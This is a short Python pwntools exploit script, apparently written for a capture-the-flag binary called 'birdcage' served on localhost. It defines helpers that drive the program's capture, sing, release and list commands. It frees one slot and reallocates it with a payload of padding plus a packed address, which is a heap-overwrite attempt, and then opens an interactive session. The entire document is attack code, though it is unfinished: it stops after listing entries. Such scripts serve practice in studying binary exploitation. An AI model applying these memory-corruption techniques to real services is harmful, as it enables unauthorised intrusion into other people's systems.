from pwn import *
elf_file = FILENAME = './birdcage'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'localhost'
POST = 10005

libc = ELF("./libc-2.27.so")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    c = remote(HOST, POST)
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    c = gdb.debug(FILENAME)

def cap(index,data):
    c.sendlineafter('>','capture {0} parrot'.format(str(index)))
    c.sendlineafter('Talk to: ',data)

def sing(index):
    c.sendlineafter('>','sing {}'.format(str(index)))

def rel(index):
    c.sendlineafter('>','release {}'.format(str(index)))

def li():
    c.sendlineafter('>', 'list')

cap(0,'aaaa')
cap(1,'bbbb')
rel(0)
payload = 'a'*16+p64(0x605010)+p64(0x0)
cap(0,payload)
li()
c.interactive()